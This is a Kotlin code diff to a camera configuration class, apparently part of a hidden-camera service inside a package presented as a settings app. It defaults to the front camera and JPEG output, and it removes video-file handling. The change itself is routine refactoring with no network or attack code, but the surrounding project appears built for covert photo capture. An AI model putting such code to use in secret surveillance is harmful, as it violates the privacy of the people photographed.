@@ -6,6 +6,7 @@ import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraImageFor
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraResolution
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.getFileName
+
 import java.io.File
 
 
@@ -13,28 +14,28 @@ class CameraConfig {
 
     private var context: Context? = null
 
+    @CameraResolution.SupportedResolution
     @get:CameraResolution.SupportedResolution
     internal var resolution = CameraResolution.MEDIUM_RESOLUTION
         private set
 
+    @CameraFacing.SupportedCameraFacing
     @get:CameraFacing.SupportedCameraFacing
     internal var facing = CameraFacing.FRONT_FACING_CAMERA
         private set
 
+    @CameraImageFormat.SupportedImageFormat
     @get:CameraImageFormat.SupportedImageFormat
     internal var imageFormat = CameraImageFormat.FORMAT_JPEG
         private set
 
+    @CameraRotation.SupportedRotation
     @get:CameraRotation.SupportedRotation
     internal var imageRotation = CameraRotation.ROTATION_0
         private set
 
-    // फोटो और वीडियो के लिए अलग-अलग फाइलें
-    internal var imageFile: File? = null
-        internal set
-    internal var videoFile: File? = null
-        internal set
-
+    internal var imageFile: File?=null
+            private set
 
     fun builder(context: Context): Builder {
         this.context = context
@@ -49,6 +50,7 @@ class CameraConfig {
         }
 
         fun setImageRotation(@CameraRotation.SupportedRotation rotation: Int): Builder {
+
             imageRotation = if (rotation != CameraRotation.ROTATION_0
                 && rotation != CameraRotation.ROTATION_90
                 && rotation != CameraRotation.ROTATION_180
@@ -59,10 +61,8 @@ class CameraConfig {
         }
 
         fun build(): CameraConfig {
-            if (imageFile == null) imageFile = File(context!!.getFileName(".jpeg"))
-            if (videoFile == null) videoFile = File(context!!.getFileName(".mp4"))
+            if (imageFile==null) imageFile = File(context!!.getFileName())
             return this@CameraConfig
         }
     }
 }
-
